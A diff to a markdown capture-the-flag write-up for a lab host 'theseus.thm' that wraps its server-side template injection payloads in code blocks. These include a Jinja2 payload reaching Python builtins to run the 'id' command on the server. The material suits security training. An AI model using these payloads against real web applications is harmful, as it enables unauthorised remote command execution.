@@ -46,13 +46,15 @@ http://theseus.thm:8080/?key={{7*7}}
 Trying a few standard SSTI payloads
 
 
-http://theseus.thm:8080/?key={{%20os.popen(%27id%27).read()%20}}
+```http://theseus.thm:8080/?key={{%20os.popen(%27id%27).read()%20}}```
 
 
 Produces an 'Internal Server Error'
 
 
-#  However,  {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+#  However,  
+
+```{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}```
 
 <img width="1204" height="267" alt="ssti" src="https://github.com/user-attachments/assets/18028f4c-cb20-49f2-8bd1-2dc44a75e53a" />
 
